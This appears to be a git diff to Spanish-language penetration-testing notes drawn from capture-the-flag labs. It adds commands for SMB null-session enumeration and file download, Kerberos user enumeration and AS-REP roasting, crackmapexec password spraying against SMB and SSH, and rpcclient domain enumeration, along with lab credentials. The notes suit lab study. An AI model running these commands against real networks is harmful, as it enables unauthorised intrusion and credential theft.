@@ -144,6 +144,7 @@ SuperEnum incluye un script para hacer la enumeracion basica de cualquier puerto
 ```s
 ./superenum Running script
 ```
+
 Enumeracion de SMTP
 SMTP puerto 25 nos provee de 3 comandos
 VRFY - Validate users
@@ -203,9 +204,24 @@ Enumeracion de Telnet y SMB
 ```s
 nmap -p 23 10.10.1.19
 ```
-SMBMap, enum4linux  nullinux, para hacer un escaneo directo a SMB
+SMBMap, smbclient enum4linux  nullinux, para hacer un escaneo directo a SMB
 ```s
 nmap -p 445 -A 10.10.1.19
+
+sudo nmap -p 445 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt
+sudo nmap -p 139 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt
+
+#Buscando Credenciales nulas
+smbclient -L 10.129.232.227 -N
+
+#Para ver los permisos de las carpetas compartidas
+smbmap -H 10.129.232.227
+#Para entrar a una carpeta
+smbmap -H 10.129.232.227 -r [Carpeta]
+#Para descargarnos un archivo
+smbmap -H 10.129.232.227 --download [Carpeta/Archivo]
+
+smbmap -H 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
 ```
 
 Enumeracion de FTP TFTP
@@ -218,17 +234,33 @@ Para TFTP(Puerto 69) existen herramientas como PortQry y Nmap
 
 
 ### [](#header-3)<a id="user_enum">Username Enumeration</a>
+
+Tenemos la utilidad GetNPUsers
+```s
+python3 GetNPUsers.py active.htb/ -no-pass -usersfile users.txt
+```
 Se pueden enumerar usuarios validos mediante kerbebrute, que escencialmente explota como Kerberos responde ante un usuario valido.
 ```s
-kerbrute_linux_386 userenum --dc 10.10.10.192 -d Mailing.local users.txt --safe -v
+kerbrute_linux_386 userenum --dc 10.10.10.192 -d Mailing.local /usr/share/wordlists/SecLists/Usernames/Names/names.txt --safe -v
 ```
-En el comando, Mailing.local es el domain del Active directory y users.txt es la lista de usuarios a probar.
-Otra alternativa más rapida podría ser un modulo de metasploit 
 
+En el comando, Mailing.local es el domain del Active directory y users.txt es la lista de usuarios a probar.
+
+
+**Nota** El reloj de la maquina debera estar cincronizado, si no esta, existe la utilidad siguiente para sincronizarlo:
+```s
+ntpdate 10.129.232.227
+```
+
+Tenmos tambien la utilidad GetUsersSPNs.py
+
+Otra alternativa más rapida podría ser un modulo de metasploit 
 ```s
 msf5 auxiliary(gather/kerberos_enumusers) >
 ```
 Podriamos recibir resultados identicos pero las opciones más estables son kerbrute o Impacket <a href="http://getnpusers.py/"> GetNPUsers.py.</a>
+
+Una vez tengamos un usuario y contrasena, GetNPUsers nos puede ayudar para solicitar un ticket de kerberos en caso de que este activo.
 
 ### [](#header-3)<a id="netbios_enum">Enumeracion de NETBIOS</a>
 El primer paso, sera descubrir si existe un dominio presente, este escaneo es pasivo y el comando a ejecutar desde una maquina windows seria:
@@ -237,6 +269,20 @@ El primer paso, sera descubrir si existe un dominio presente, este escaneo es pa
 C:\>net view /domain
 ```
 ## [](#header-2)<a id="reconocimiento">Initial Access</a>
+Fuerza bruta de contrasenas SMB y SHH
+```s
+#en mi maquina parrot tengo esta utilidad como cme
+#Con lista de usuarios y contrasenas
+crackmapexec smb 10.10.10.184 -u users -p credentials --continue-on-success
+crackmapexec ssh 10.10.11.166 -u users -p password --continue-on-success
+
+#validacion
+crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+
+#Listar los recursos compartidos con el nuevo usuario
+cme smb 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
+```
+
 ## [](#header-2)<a id="Breaching_ad">Breaching Active Directory</a>
 NTLM Authenticated Services
 New Technology LAN Manager (NTLM). Es el modo de autenticacion usado por varias tecnologias integradas en el AD, como Mail (Outlook Web App), accesos a RDP expuestos a internet, VPN que son integradas con AD, aplicaciones web que hacen uso de NetNTLM.
@@ -516,6 +562,16 @@ python -m pip install xlrd
 #Actualizamos la base de datos con 
 windows-exploit-suggester.py --update
 
+Si tenemos contrasenas y usuarios validos, podemos intentar una conexion con rpcclient
+```s
+rpcclient 10.129.232.227 -U 'SVC_TGS%GPPstillStandingStrong2k18'
+rpcclient 10.129.232.227 -U 'SVC_TGS%GPPstillStandingStrong2k18' -c 'enumdomusers'
+
+enumdomgroups
+querygroupmem [rid]
+queryuser [rid]
+querydispinfo
+```
 
 ## [](#header-2)<a id="Post_priv_escalation">Post priv escalation</a>
 
